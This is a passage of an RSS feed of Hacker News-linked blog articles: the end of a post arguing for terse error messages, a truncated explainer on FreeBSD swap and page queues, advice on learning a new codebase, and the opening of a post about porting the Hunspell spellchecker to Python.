lorem : The term 'lorem' is not recognized as the name of a cmdlet, function, script file, or operable program.
Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ lorem --ipsum dolor -sit amet
+ ~~~~~
+ CategoryInfo          : ObjectNotFound: (lorem:String) [], CommandNotFoundException
+ FullyQualifiedErrorId : CommandNotFoundException

PS C:\&gt; exit
</code></pre>
<p>and GNU Bash:</p>
<pre><code>$ lorem --ipsum dolor -sit amet
bash: lorem: command not found
$ 
</code></pre>
<p>The first thing you'll notice is that PowerShell's output is far, <em>far</em>
more verbose. You've got an error, a nice helpful message suggesting that
you "check the spelling of the name and try again", and a stack trace.
Meanwhile, <code>bash</code> just tells you <code>command not found</code>.</p>
<p>So: which error message is better?</p>
<p>Eric Raymond, in his excellent book <em>The Art of UNIX Programming</em>, explains
that a good UNIX program should output the least amount of stuff that it
can, a rule he calls the "Rule of Silence":</p>
<blockquote>
<p>One of Unix's oldest and most persistent design rules is that when a
program has nothing interesting or surprising to say, it should <em>shut
up</em>. Well-behaved Unix programs do their jobs unobtrusively, with a
minimum of fuss and bother. Silence is golden.</p>
<p>This "silence is golden" rule eveolved originally because Unix predates
video displays. On the slow printing terminals of 1969, each line of
unnecessary output was a serious drain on the user's time. That
constraint is gone, but excellent reasons for terseness remain. (Raymond,
43)</p>
</blockquote>
<p>He quotes Ken Arnold:</p>
<blockquote>
<p>...important information should not be mixed in with verbosity about
internal program behaviour. If all displayed information is important,
important information is easy to find.</p>
</blockquote>
<p>Raymond continues:</p>
<blockquote>
<p>Well designed programs treat the user's attention and concentration as a
previous and limited resource, only to be claimed when necessary.
(Raymond, 44)</p>
</blockquote>
<p>It is Arnold's quote that I'd like to expand on. Not only should you not
include unimportant information, but you should also output the important
stuff in the tersest possible form.</p>
<p>Why? Because <strong>users don't like reading.</strong></p>
<p>When a user is using a particular application, they are usually trying to
get something done. They may be trying to check their email, launch an IM
client, or start their browser. Reading stuff takes time, and thus slows
the user down. Because of this, users will do the minimal amount of reading
that they can.</p>
<p>Therefore, a terse error message is more likely to get properly read than a
verbose error.</p>
<p>"But wait! PowerShell's message is more user-friendly, because it reminds
the user to check their spelling!" Pffft. Anyone smart (for lack of a
better word!) enough to use PowerShell will know that they should
double-check their spelling without an error message telling them to do so.</p>
<p>And even in "normal" applications -- where the majority of users are not
knowledgable enough to know that their spelling could be to blame -- an
error message that's too verbose is <em>still</em> problematic, because many, if
not most, non-techy users won't bother reading it!</p>
<p>And if you <em>simply must include</em> a help/hint message -- do so in a way that
won't distract the user from the actual error.</p>
<p>For example, just look at the default Windows error message for an
incorrect password:</p>
<blockquote>
<p>You can't sign into your device right now. Go to account.live.com to fix
the problem, or try the last password you used on this device.</p>
</blockquote>
<p>Now, this could have just been written as</p>
<blockquote>
<p>Login incorrect</p>
</blockquote>
<p>which is the error message that's displayed on Linux when a user attempts
to login from a TTY.</p>
<p>However: a "Windows account" is actually a Microsoft account, and the
password is the same. Which means that if a user changes her Microsoft
account password on another device, and then tries to login on another
device that hasn't connected to the internet yet and received the new
password, she will have to use the last password she used on that
particular device.</p>
<p>Most users, however, probably won't realize this in such
a scenario, so it's OK to say that in the error message. The trick is to
include it in such a way so as to not make the error message seem too long:</p>
<blockquote>
<p><strong>Incorrect password</strong></p>
<hr>
<p><em>Note: try using the last password you used on this device.</em></p>
</blockquote>
<p>Notice how the main error ("Incorrect password") is in bold, and the hint,
two lines below, was in italics. I didn't put the hint in
<small>small</small> text, because that would give the impression to a
naive user that it was some kind of legal/technical message that she
doesn't have to pay attention to.</p>
<h2 id="anti-case-studies">(anti-)case studies</h2>
<h3 id="google">Google</h3>
<p>Take a look at the error message given when your Google search didn't turn
up anything:</p>
<blockquote>
<p>Your search -- <strong>asdf;asdf;asdf;asdf;asdf;asdf;as...</strong> did not match any
documents.</p>
<p>Suggestions:</p>
<ul>
<li>Make sure all words are spelled correctly.</li>
<li>Try different keywords.</li>
<li>Try more general keywords.</li>
<li>Try fewer keywords.</li>
</ul>
</blockquote>
<p>For one thing, repeating the entire search query in bold isn't necessary.
The user already knows what they searched for.</p>
<p>The suggestions, however,
are OK since they are visually separate from the error.</p>
<p>Fixed:</p>
<blockquote>
<p><strong>No results found.</strong></p>
<hr>
<p>Tips:</p>
<ul>
<li>Check your spelling.</li>
<li>Try different keywords.</li>
<li>Try more general keywords.</li>
<li>Try fewer keywords.</li>
</ul>
</blockquote>
<p>Notice how I condensed the main error message and the first suggestion,
and replaced <code>Suggestions:</code> with <code>Tips:</code>.</p>
<h3 id="ssh">SSH</h3>
<pre><code>$ ssh tilde.zone
The authenticity of host 'tilde.zone (51.79.32.49)' can't be established.
ECDSA key fingerprint is SHA256:0EmsPM79b0dq7McKYu0fsEiDoiv4JhamrGTOJ3IbShc.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'tilde.zone,51.79.32.49' (ECDSA) to the list of known hosts.
kiedtl@tilde.zone's password: 
Permission denied, please try again.
kiedtl@tilde.zone's password: ^C

$
</code></pre>
<p>I see several things wrong:</p>
<ul>
<li>the first line (<code>The authenticity of host can't be established</code>) is too verbose.</li>
<li>the second line (<code>ECDSA key fingerprint is...</code>) is too verbose.</li>
<li>the prompt to continue to way too verbose.</li>
<li>the warning is too verbose.</li>
<li>the <code>permission denied</code> error is just a little bit too verbose.</li>
</ul>
<p>Fixed:</p>
<pre><code>$ ssh tilde.zone
Authenticity of 'tilde.zone (51.79.32.49)' unknown.
ECDSA key fingerprint: SHA256:0EmsPM79b0dq7McKYu0fsEiDoiv4JhamrGTOJ3IbShc
Continue? (yes/no) yes
Warning: added host to list of known hosts.
kiedtl@tilde.zone's password: 
Permission denied, try again.
kiedtl@tilde.zone's password: ^C

$
</code></pre>
<p>As you can see, I've condensed the first line, continue prompt, and warning
quite a bit; I've also changed the second line to not be a sentence, thus
eliminating a whole two letter word ;)</p>
<p>The warning has been changed to not repeat the host and ip address, which
was already listed previously. The completely unnecessary <code>please</code>
has been removed from the password error.</p>
<h3 id="su"><code>su</code></h3>
<p>The example with the shortest name also has the shortest error message,
<code>su</code>:</p>
<pre><code>$ su
Password:
su: Authentication failure
</code></pre>
<p>Notice the beautifully terse error message.</p>
<p>(And if you're wondering why <code>su</code> just doesn't say <code>incorrect password</code>,
it's probably due to <code>su</code> being incapable of knowing whether it's really
the password that was wrong, or the username, or something else.)</p>
<h3 id="gnu-cat">GNU <code>cat</code></h3>
<p><code>cat</code>'s error on an incorrect path is terse, but not terse enough:</p>
<pre><code>$ cat invalid
cat: invalid: No such file or directory
$
</code></pre>
<p>Why say "no such file or directory"? <code>cat</code> doesn't even read directories!</p>
<p>Solution:</p>
<pre><code>$ cat invalid
cat: invalid: invalid path
</code></pre>
<p><em>more case studies will be added as I find them.</em></p>
<h2 id="conclusion">conclusion</h2>
<p>Terser is better. Software isn't the place to show off your writing skills.</p>
<p>And if you really must include some kind of hint or suggestion, make it
visually separate from the error message.</p>





<br><a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAAAPCAIAAAD8q9/YAAAABGdBTUEAANbY1E9YMgAAAZ9JREFUSMflljFrwkAUx98H6J3N6KbXFjtJJZNIB+Ntds0kdIxDp3boTYJ0UDcLutxXOCfbpejQSRE5+g38CvcVrtCTNJVLiFAKaR4ZwvH+yf3yf+/lAHIYOjfxDTybi+jVvesCwGg0ssoopRjjKZ+Y5O3HtnBayISvduApn2CM42hD5splxeQv3hf9fj/DwI3rRrlcTq4NKSUAdG47RrKRm/ZNO6vACCNjr5SSEAIAlFKlFKUUAAghUkpjcs2thVU9fh5b58Lhy37eWxejKmtynOSwV9MA9556ALBcLrXWhBDf97XW7Cscx1FKcc6FEGYRYRRW9Wq9sj794CZhN3GZvyWxAz883gOAlFIpFZ1bvu+7rhutasYYxtioXt9e1tt1gsNWT+J2HPdp0kuOALY6TCkNgsA4zBjjnO8dRkc4nOCVtYzTOHyUJL6H0b6HhRCO4wBAEARhD7uuu9vttNatVqt6VU3Zw+mB/7qHZ3NRb9RLpVKOpvSUTxA6GQ6HCcCe551fnP2T/3A4ugaDgZW26TWLxWK2T1r5OkvnKj4Bfm7H+J/sGfMAAAAASUVORK5CYII="></a>
<br>


</div></div>]]>
            </description>
            <link>https://tilde.team/~kiedtl/blog/chatterbox/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789837</guid>
            <pubDate>Fri, 15 Jan 2021 11:56:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploring Swap on FreeBSD]]>
            </title>
            <description>
<![CDATA[
Score 77 | Comments 19 (<a href="https://news.ycombinator.com/item?id=25789809">thread link</a>) | @rodrigo975
<br/>
January 15, 2021 | https://klarasystems.com/articles/exploring-swap-on-freebsd/ | <a href="https://web.archive.org/web/*/https://klarasystems.com/articles/exploring-swap-on-freebsd/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>




<div>
<p>On modern Unix-like systems such as <strong>FreeBSD</strong>, “<em>swapping</em>” refers to the activity of paging out the contents of memory to a disk and then paging it back in on demand. The page-out activity occurs in response to a lack of free memory in the system: the kernel tries to identify pages of memory that probably will not be accessed in the near future, and copies their contents to a disk for safekeeping until they are needed again. When an application attempts to access memory that has been swapped out, it blocks while the kernel fetches that saved memory from the swap disk, and then resumes execution as if nothing had happened.</p>



<p>All of the above might sound perfectly sensible. After all, disks are typically much larger than RAM, so why not use them to cache infrequently accessed pages of memory? Yet, many experienced system administrators treat swapping as an abnormal activity, a sign of something amiss. This is justifiable: until relatively recently, the disks typically used for swapping had access latencies millions of times higher than RAM. </p>



<p>That is, an application waiting for memory to be paged back in from swap would have to wait for tens of milliseconds while a regular RAM access takes tens of nanoseconds. Heavy usage of swapped-out memory would thus ruin the performance of a system, so swap activity is often taken as a sign that the system needs more RAM or that memory usage needs to be tuned. A common “solution” is to disable swapping entirely, forcing the operating system to resort to other means to free up memory when necessary.</p>



<p>In 2021, cheap SSDs have become commonplace and have performance characteristics much better suited to swapping, so it seems worthwhile to revisit how swapping works in FreeBSD, and try to provide some insight into frequently raised issues.</p>



<h5><strong>Swapping: when and how much?</strong></h5>



<p>Computer systems have a fixed amount of RAM. It is up to the operating system to optimize its usage. Ideally, operating systems would be able to peer into the future to see which data is about to be accessed; with this information they could ensure that the data is available in RAM before it is accessed. Being constrained to the real world, however, they use a set of heuristics which try to predict future memory accesses. An effective and commonly used heuristic is to cache recently accessed data in memory since it is likely to be accessed again, in the near future. When no free memory is available and an application accesses uncached data, FreeBSD determines which memory was least recently accessed and evicts its contents to make room for new data. This algorithm is called Least-Recently Used (LRU).</p>



<p>Note that the kernel cannot simply throw away data[1]; if a copy is not available on disk it must first page out the data before releasing the backing memory. Thus, swap activity is closely tied to LRU.</p>



<p>Implementing LRU precisely comes with a lot of undesirable overhead, so FreeBSD implements an approximation of LRU – it tries to find memory that has not been accessed in a long time, and evicts that. As part of this implementation, FreeBSD partitions the system’s memory into a set of queues: the active, inactive and laundry queues[2]. The sizes of each of these queues is shown by <em>top(1):</em></p>



<pre><code>  Mem: 2591M Active, 6576M Inact, 1389M Laundry, 4155M Wired, 1543M Buf, 1130M Free
  Swap: 8192M Total, 1623M Used, 6569M Free, 19% Inuse
</code></pre>



<div data-columns="3" data-layout="50-25-25"><div>




<div><div>
<p>Did you know?</p>



<h2>You can maximize the <strong>power of your FreeBSD</strong> infrastructure with our <strong>Support Subscription!</strong></h2>




</div></div>




</div></div>



<p>“<em>Wired</em>” pages are not eligible to be paged out and thus do not participate in LRU. Active pages are frequently referenced; typically, they are mapped into one or more process’ address spaces. For example, memory returned by <em>malloc</em>(3) will initially be resident in the active queue. To determine which active pages are no longer being referenced, a kernel process called the “page daemon” periodically examines the recent access history of each page. Unreferenced pages are aged out of the active queue and into the inactive queue.</p>



<p>The inactive queue contains pages that have not been accessed recently. Such pages are good candidates for reuse if the kernel needs to handle a shortage of free memory. The queue helps order pages by recency of access: newly inactive pages are inserted at the tail of the queue, and pages are reclaimed from the head of the queue.</p>



<p>Earlier we noted that a well-behaved operating system must not throw away data when handling a free memory shortage. If some data is in a page of memory and no copy of that data exists in stable storage, then the page is said to be “dirty” and before it can be reused its contents must be paged out to storage. Otherwise, the page is “clean.” For example, if one searches a file using grep(1), that file’s data must be loaded into memory, but because grep(1)merely reads that data, that memory will be clean and can be reused at any point.</p>



<p>The active and inactive queues will contain a mix of clean and dirty pages. When reclaiming memory to alleviate a shortage, the page daemon will free clean pages from the head of the inactive queue. Dirty pages must first be cleaned by paging them out to swap or a file system. This is a lot of work, so the page daemon moves them to the laundry queue for deferred processing. The laundry queue is managed by a dedicated thread, the laundry thread, which is responsible for deciding when and how much to page out. The relationship between these queues is depicted here:</p>



<div><figure><img data-attachment-id="3546" data-permalink="https://klarasystems.com/articles/exploring-swap-on-freebsd/image-4/" data-orig-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?fit=340%2C270&amp;ssl=1" data-orig-size="340,270" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-4" data-image-description="" data-medium-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?fit=300%2C238&amp;ssl=1" data-large-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?fit=340%2C270&amp;ssl=1" loading="lazy" width="340" height="270" src="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?resize=340%2C270&amp;ssl=1" alt="" srcset="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?w=340&amp;ssl=1 340w, https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?resize=300%2C238&amp;ssl=1 300w" sizes="(max-width: 340px) 100vw, 340px" data-recalc-dims="1"></figure></div>



<p><strong>To summarize:</strong></p>



<p>– The page daemon migrates unreferenced pages from the active queue to the inactive queue (1).</p>



<p>– To free up memory, the page daemon scans pages at the head of the inactive queue (2), frees clean pages (6), and moves dirty pages to the tail of the laundry queue (3).</p>



<p>– When the laundry thread decides to clean some dirty pages (4), it hands them to a pager, which writes their contents to stable storage and places the cleaned pages in the inactive queue (6).</p>



<p>– If a page is referenced after it is placed in the inactive or laundry queues, it will lazily be moved back to the active queue.</p>



<p>One possible strategy for the laundry thread is to just do nothing, relying on reclamation of clean pages to satisfy demand for free memory. Indeed, this is effectively what happens when you disable swap altogether. However, pages in the laundry queue are inactive by definition, and unused memory is wasted memory. Another possible strategy is to launder pages as soon as they enter the queue, but this can result in unnecessary I/O.</p>



<p><strong>The policy used by the laundry thread makes use of several signals:</strong></p>



<p>1) The ratio of the lengths of the inactive and laundry queues,</p>



<p>2) the number of clean pages reclaimed since the last set of page-outs, and</p>



<p>3) the size of the inactive queue relative to its target (minimum) size.</p>



<p>The laundry thread uses the first two signals to control “background” laundering, while the third is used to drive “shortfall” laundering.</p>



<p>The idea behind background laundering is to try and ensure that some dirty pages are paged out before a shortage of clean inactive pages occurs. When the system is out of both free pages and clean inactive pages, applications that need free memory are effectively stuck waiting for some page-outs to swap to complete. The laundry thread therefore tries to ensure that the laundry queue does not grow too large: the larger the ratio (1) of queue sizes, the more frequently the laundry thread will perform page-outs of dirty memory. Because it is a waste of I/O bandwidth to page out dirty memory when there is no shortage of free memory, the laundry thread monitors the activity of the page daemon to determine how frequently it should perform page outs.</p>



<h5><strong>Why is my system using so much swap space?</strong></h5>



<p>When a dirty page’s contents have been paged out to swap, the page is marked clean and becomes eligible for reclamation. At this point, the page’s contents exactly match the copy saved to the swap device. (The page could be dirtied again, in which case it was recently accessed and belongs back in the active queue.) Suppose the page is freed, and later an application tries to read the data. A fresh page will be allocated and the data is paged back in from swap, at which point the application can run again and use that data. At this point the page is still clean – only if the data is written to will the page be marked dirty – so the copy in the swap device is still valid and there is no reason to discard it.</p>



<p>More generally, a write-once-read-many access pattern can be common for some types of data. A long-lived process may allocate and write to a region of memory during startup and thereafter only read from that memory, for example. If that memory is paged out, FreeBSD will retain the copy in swap so long as it remains valid. Otherwise, in order to reclaim that memory, it would have to perform another expensive page-out operation.</p>



<p>It is thus common to see moderate swap space usage even when plenty of free memory is available[3]: at some point in the past, demand for free memory triggered page-outs to swap, and the swapped-out data remained valid.</p>



<h5><strong>Why is the kernel killing my processes?</strong></h5>



<p>In some scenarios, shortfall laundering may not be enough to alleviate a shortage of free memory. A process may have a runaway memory leak or the system may be oversubscribed to the point where it becomes completely unresponsive. The laundry thread may be paging out memory as quickly as possible but cannot meet demand, or the swap device may be full. At this point the kernel has little choice but to try and kill processes to reclaim memory and restore stability to the system – the dreaded OOM (out-of-memory) kill.</p>



<p>FreeBSD will trigger OOM kills in a couple of scenarios. First, if the page daemon repeatedly fails to reclaim _any_ pages from the inactive queue, it will eventually trigger OOM kills. If the swap device is full, the laundry thread will be …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://klarasystems.com/articles/exploring-swap-on-freebsd/">https://klarasystems.com/articles/exploring-swap-on-freebsd/</a></em></p>]]>
            </description>
            <link>https://klarasystems.com/articles/exploring-swap-on-freebsd/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789809</guid>
            <pubDate>Fri, 15 Jan 2021 11:53:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to join a team and learn a codebase (2020)]]>
            </title>
            <description>
<![CDATA[
Score 237 | Comments 51 (<a href="https://news.ycombinator.com/item?id=25789336">thread link</a>) | @minicaionut
<br/>
January 15, 2021 | https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html | <a href="https://web.archive.org/web/*/https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<span><a href="https://www.samueltaylor.org/index.html">Home</a> &gt; <a href="https://www.samueltaylor.org/articles/index.html">Articles</a> &gt; new codebase, who dis? (How to Join a Team and Learn a Codebase)</span>

<p>I have switched teams more often than I have had to implement an AVL tree, and you can guess which one of those two was taught in school. I wish someone had taught me how to join a new team! While learning a new codebase can be daunting, I've found a few things that work for me.</p>
<p>You should do at least three things when joining a new team. The order of these three can be whatever you like, but all three should be done as soon as reasonably possible.</p>
<p><strong>First</strong>, you’ll likely set up the development environment. As you do this, pay attention to just what it is that you're setting up. For instance, if you need to get Redis running locally, then that's a good hint that there's some caching happening somewhere. Noting the order in which you run internal projects helps you understand dependencies. If the feature store needs to be running before you bring up the model serving service, that's a hint that the model serving service may depend upon the feature store. Such dependencies start to hint at the overall architecture.</p>
<p>Take notes on the exact commands you’re running and packages you’re installing. You’re bound to run into something that’s changed since the setup docs were written, and being able to correct them is a quick win you can provide to the new team. Plus, it's good to know exactly how you ruined your system installation of Python.</p>
<p>Ideally, the code you're working on should have some sort of automated test suite in place. A good way to start experimenting with and understanding the code is to get that test suite successfully running, then make changes to the codebase completely at random and see what breaks.</p>
<p>The <strong>second</strong> thing you should do is get some overview of the architecture. Some teams will have a document describing this, and if that document is an accurate depiction of reality then you should certainly work to understand it. In any case, asking a more senior person on the team to give you an overview is a good idea. They should know how up-to-date that document is (if it does exist) and also be able to describe and/or draw the architecture for you. Here are some sample questions you can consider asking:</p>
<ul>
<li>What repositories (or portions of repositories) do we own and/or work on most frequently? What do each of them do?</li>
<li>Where does our code run? (e.g. EC2 Instances, Google's Kubernetes Engine, on prem)</li>
<li>What does the deployment pipeline look like? How does a feature get from my laptop to live in production?</li>
<li>Do we have certain services, packages, classes, or files that are a real headache? Areas that are particularly unreliable or error-prone?</li>
<li>Are there external API's, vendors, or products that we use or rely on? (e.g. SendGrid, DataDog, MySQL)</li>
</ul>
<p>Similar to environment setup, an easy thing you can do to help the team is to document that architectural overview (or update the existing document). Write down what you learned, take a picture of the diagrams that were drawn, and post that information somewhere visible to the team. Be sure to put an "as of" date on your changes. Even stable projects exhibit some change over a long enough time period, so this date will help future readers know if they can trust this document.</p>
<p>A <strong>third</strong> thing you should do when starting on a new team is start understanding the business. If you're new to the company, figure out its mission, product offering(s), and goal(s). Then work to understand how your team fits into those things. Some sample questions include:</p>
<ul>
<li>How can our team make an impact on the company's goals?</li>
<li>If our code were to break horrifically, who would get angry? How fast would that happen?</li>
<li>What other teams do we have the most interaction with? What services/codebases do they own? Do we share parts of our codebase with other teams?</li>
</ul>
<p>Without an understanding of the team's place in the company, you're doomed. You won't have sufficient context to execute your work well.</p>
<h2>Mindset</h2>
<p>I strongly believe that learning a new codebase happens best through implementing real features (even if they are small to start with). The whole point of being on this team as an individual contributor is to build stuff, and there is no better way to learn how to do something than by spending quality time doing that exact thing. As you build skill and understanding, you can work on larger and larger projects over time.</p>
<p>Implementing something will require you to read the code. But "read" may be a misleading word here, because reading code is dramatically different from reading a novel. Code is typically organized with more related code being closer together (in the same directory, package, class, or file). Can you imagine a novel written in this way? If Tolkien had placed all scenes of two characters fighting each other in adjacent pages, while all scenes with magic in them occurred in a separate book? How absurd!</p>
<p>Though learning to code taught me the basics of reading code, nobody ever taught me how to read a large codebase. To do so, we must adopt a certain mindset. Balance understanding each intricate detail against making impact quickly. Quick impact helps establish your reputation on the team and gets you to that accurate/intricate understanding faster than trying to read everything up front.</p>
<p>The rule of thumb I use is to understand something just enough to express what it does without necessarily knowing exactly how it does that. This process is called "chunking," and it relies on the fact that once you have a basic understanding of a unit of code, "you don't need to remember all the little underlying details" (Oakley). If you're worried about not understanding everything in minute detail, don't be afraid to take a note to come back and understand that chunk more fully.</p>
<p>This understanding will grow recursively: first, you understand what the various services do. Then, you identify the particular service you need to modify and start to understand the various modules within that service. In the modules you modify, you'll start to understand the classes contained. The base case of this recursive process is the individual line.</p>
<p>Keep in mind that different teams may implement the same concept or pattern in different ways. Understanding why your current team chose the way they did is another way new teammates can help the team. It's totally possible that your new team hasn't heard of the cool way to implement singletons that you like. It's equally possible that your way is worse in some way you didn't know. Either way, someone gets to learn something!</p>
<p>The last mindset recommendation I'll give before we dive into the process is to try to understand the code both in terms of code paths and data flows. Think about which objects know what information and how that information flows between parts of the system.</p>
<h2>Process</h2>
<p>I recommend this process for working in any codebase:</p>
<ol>
<li><strong>Locate the portion of code most relevant to the immediate task</strong> at hand.</li>
<li>Understand that code enough to <strong>form a hypothesis</strong> about the change you need to make.</li>
<li>Make that change and <strong>test your hypothesis</strong>. Sometimes the best way will be to click around in the UI or run a particular script. Sometimes the easiest path is to write a test that describes the behavior you're after.</li>
<li>If your hypothesis was incorrect, return to step 2. Understand why that change didn't do what you thought it would, and develop a new hypothesis.</li>
<li>Once you have working code, <strong>improve its quality</strong>. Write a test (or a few) that document the changes in behavior you made. Refactor your code for clarity and style.</li>
</ol>
<p>This scientific approach guides us gradually toward correct, high quality code without having to understand each and every bit of code around our change.</p>
<h2>Tools</h2>
<p>While you could certainly get by with just a text editor and some patience, a wide variety of tools exist that help us read code more effectively throughout the process identified above.</p>
<h3>Identifying relevant code</h3>
<p>While step one gets easier over time as we build familiarity with some portion of code, we often begin step one completely lost. A few approaches are helpful here: running the code, project search, and code search.</p>
<p>Running the code helps you understand it. Before you start changing things, understand what already exists. This could mean reproducing a bug locally, finding the place in the UI where the new feature will go, or any number of other things. When you do, stepping through the execution in a debugger will give you a strong start on understanding what is going on.</p>
<p>By "project search," I mean searching artifacts created as part of the software development lifecycle. Particularly useful are issue trackers like JIRA/Asana/Pivotal Tracker, pull requests and issues in tools like GitHub and GitLab, and the git history itself. Because few tasks are truly novel, we can often gain understanding by looking for similar past work. Try several different keywords. Sometimes you'll find a pull request that implements something very similar to what you want to do, and you can use that as a guide. Trying to divine something from scratch, while sometimes necessary, requires significantly more effort than adapting from an example.</p>
<p>Code search is just what it sounds like. For code that you have checked out locally, I highly recommend using a tool specifically built for recursive search like ack, Silver Searcher (ag), or ripgrep. But you won't always have every bit of code at the company checked out locally, and sometimes it's useful to be able to search exhaustively. For this use case, tools like OpenGrok or Sourcegraph are super helpful. GitHub and GitLab also offer ways to search all code within a specific organization.</p>
<p>No matter which tool you're using, try several keywords you think might be relevant. Consider changing case sensitivity. You may have better results filtering down to specific file types.</p>
<h3>Understanding code</h3>
<p>Using these various search tools, we arrive at a set of relevant locations. Thus, we arrive into step two of our process: …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html">https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html</a></em></p>]]>
            </description>
            <link>https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789336</guid>
            <pubDate>Fri, 15 Jan 2021 10:54:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rebuilding the spellchecker]]>
            </title>
            <description>
<![CDATA[
Score 148 | Comments 24 (<a href="https://news.ycombinator.com/item?id=25789099">thread link</a>) | @zverok
<br/>
January 15, 2021 | https://zverok.github.io/blog/2021-01-05-spellchecker-1.html | <a href="https://web.archive.org/web/*/https://zverok.github.io/blog/2021-01-05-spellchecker-1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <h2 id="how-i-decided-to-write-a-spellchecker-and-almost-died-trying">How I decided to write a spellchecker and almost died trying</h2>

<p>A few years ago I had a fun idea for a “weekend project”: pure-Ruby spellchecker. Ruby is my language of choice, and no-dependencies spellchecker seemed a small useful tool for the CI environment: for example, to check comments/docs spelling without installing any third-party software. I actually <em>could’ve</em> pulled out the project in its limited scope (only English, only spot misspelled words without fixing, limited dictionary) with just a flat list of known words, but that’s not what happened.</p>

<p>Back then, I decided to make a moderately generic tool, at least able to work with multiple languages. Fortunately (or so I believed!), there were many already existing and freely available spellchecking dictionaries distributed as LibreOffice and Firefox extensions. All of those dictionaries are in the format defined by the <strong><a href="http://hunspell.github.io/">Hunspell</a></strong> tool/library—which is an open-source library that is used for spellchecking in Libre/OpenOffice, Mozilla products (Firefox, Thunderbird), but also Google Chrome/Chromium, macOS, several Adobe products, and so on.</p>

<p>The dictionaries looked like easy to reuse text files with some (“insignificant” as it seemed) metadata, and the whole “use Hunspell dictionaries from pure Ruby spellchecker” project <em>still</em> felt like a “weekend-long” one, for the first few weekends. Only gradually the underwater complexity of the multilanguage word-by-word spellchecking uncovered. Eventually, I was distracted from the project and abandoned it, but I still had the fascination with the seemingly-simple, actually-mind-blowingly-complicated Hunspell, the software everybody used daily and hardly ever notice.</p>

<p>The idea to dig deeper into it, to <em>understand</em> it and <em>explain</em>, grew on me and bothered me for quite some time. And what is a better way to understand something, if not to retell it in your own words? After several lazy and not very far-progressed attempts to write something Hunspell-alike (twice in Ruby, once in Rust, once in Python), eventually, in February 2020, the task I settled down to solve is: “explanatory rewrite” of the Hunspell into high-level language with a lot of comments. I achieved this goal by December 2020, with the first release of the <a href="https://github.com/zverok/spylls">Spylls</a> project: <strong>the port of Hunspell’s core algorithms into modern, well-documented, well-structured Python</strong>.</p>

<p>And now I want to share some insights of what I uncovered on the road: about spellchecking in general and Hunspell in particular.</p>

<p>In the ongoing article series, I’ll cover these topics:</p>

<ul>
  <li>What is Hunspell, why is it significant, and why try to “explain” it (current article)</li>
  <li>Base spellchecking concepts: lookup and suggest, as seen by Hunspell</li>
  <li>How lookup (checking if the word is correct) works, and why it could be much more complicated than “just look in the list of the known words”</li>
  <li>How suggest (proposed fix for the incorrect word) works, and how hard it is to estimate its quality</li>
  <li>A closer look into Hunspell’s dictionary format. It is the most widespread open dictionary format in the world, and we’ll see what linguistic and algorithmic information it <em>potentially</em> can carry, and what part of it is actually used in existing dictionaries</li>
  <li>Some details on Spylls implementation process and results</li>
  <li>Closing thoughts on the big picture of word-by-word spellchecker problem, and Hunspell’s approach to it</li>
</ul>

<h3 id="what-is-hunspell">What is Hunspell?</h3>

<blockquote>
  <p><strong>Note:</strong> The information on Hunspell’s origins and history is mostly my guesses, following partial and incomplete sources everywhere.</p>
</blockquote>

<p>Hunspell (<small><a href="https://en.wikipedia.org/wiki/Hunspell">Wikpedia article</a></small>), initially <strong>Hun</strong>garian spellchecker, emerged as an alternative for previously existing aspell/ispell/myspell somewhere in 2002 (I guess?). It was created by László Németh, in a need of supporting languages with complicated suffixing/prefixing rules and word compounding (such as Hungarian). Hunspell’s design seemingly proved itself to be flexible enough to support most of the world’s languages, and in a few years, it became the most used spellchecker in the world. You have most probably used it even if you’ve never heard the name before today: Hunspell is the default spellchecking engine in Chrome and Firefox, Libre/OpenOffice, Adobe products, and macOS (not an exhaustive list). Dictionaries in Hunspell format exist for almost all actively used languages for which the concept of word-by-word spellchecking makes sense<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>.</p>

